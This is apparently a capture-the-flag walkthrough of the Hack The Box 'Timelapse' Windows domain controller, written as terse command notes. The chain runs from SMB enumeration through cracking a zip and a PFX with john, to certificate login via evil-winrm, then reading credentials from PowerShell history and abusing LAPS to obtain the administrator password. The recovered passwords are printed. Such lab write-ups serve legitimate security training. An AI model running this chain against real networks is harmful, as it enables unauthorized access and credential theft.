----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Timelapse
# 14/4/2023
10.10.11.152

----------------------------------------------------
# nmap
----------------------------------------------------
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-04-14 18:16:26Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?

----------------------------------------------------
# enum
----------------------------------------------------
smbclient -L //10.10.11.152/
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 

smbclient //10.10.11.152/Shares
smb: \Dev\> get winrm_backup.zip 

zip2john winrm_backup.zip > zip.john
john zip.john -wordlist:/usr/share/wordlists/rockyou.txt

supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
thuglegacy

evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S

type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

net user svc_deploy

----------------------------------------------------
# priv esc
----------------------------------------------------
upload AdmPwd.PS
https://github.com/ztrhgf/LAPS

Find-AdmPwdExtendedRights -identity *

Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders

get-admpwdpassword -computername dc01 | Select password

└─$ evil-winrm -i 10.10.11.152 -u administrator -p '/1B@QZe3{BAAwzs%KY$pTb7d' -S

evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Get-ADComputer DC01 -property 'ms-mcs-admpwd'

;cV(08qO$#wTC!G+OZICB0L8
evil-winrm -i timelapse.htb -S -u administrator -p ';cV(08qO$#wTC!G+OZICB0L8'